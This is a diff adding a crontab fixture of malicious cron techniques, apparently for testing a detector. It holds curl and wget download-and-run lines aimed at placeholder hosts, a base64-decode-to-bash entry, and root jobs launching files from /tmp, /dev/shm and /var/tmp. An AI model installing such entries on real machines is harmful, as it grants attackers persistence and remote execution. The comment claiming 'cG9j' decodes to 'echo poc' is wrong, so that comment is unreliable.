@@ -1,0 +1,47 @@
+# ============================================================
+# POC: Malicious crontab — harmless sample for detector testing
+# DO NOT place this in /etc/crontab on a real system.
+# ============================================================
+
+SHELL=/bin/bash
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# --- Technique 1: execution from /tmp/ ---
+# Severity: HIGH
+# Attackers drop a payload to /tmp/ (world-writable, noexec often disabled)
+# and schedule it via cron to survive reboots.
+# The file is harmless here — it's just a path string.
+* * * * * root /tmp/poc_beacon.sh
+
+# --- Technique 2: curl piped directly to bash ---
+# Severity: HIGH
+# Classic "living off the land" download-and-execute.
+# The URL is fake; no real request is made in this POC.
+*/5 * * * * nobody curl http://192.0.2.1/update.sh | bash
+
+# --- Technique 3: silent curl piped to shell ---
+# Severity: HIGH
+# -s suppresses output to avoid detection in logs.
+@hourly www-data curl -s http://192.0.2.99/check | sh
+
+# --- Technique 4: wget piped to bash ---
+# Severity: HIGH
+# wget variant of the same pattern.
+0 3 * * * root wget http://192.0.2.1/payload.sh | bash
+
+# --- Technique 5: base64 decode and execute ---
+# Severity: HIGH
+# Obfuscated payloads encoded in base64 to evade simple string grep tools.
+# The b64 string below decodes to the harmless text "echo poc" — not executed here.
+*/10 * * * * root echo cG9j | base64 -d | bash
+
+# --- Technique 6: execution from /dev/shm/ ---
+# Severity: HIGH
+# /dev/shm is a RAM-backed tmpfs — files disappear on reboot,
+# making forensic recovery harder.
+@reboot root /dev/shm/implant
+
+# --- Technique 7: execution from /var/tmp/ ---
+# Severity: HIGH
+# /var/tmp persists across reboots unlike /tmp — preferred by stealthy actors.
+0 0 * * 0 root /var/tmp/.hidden_updater
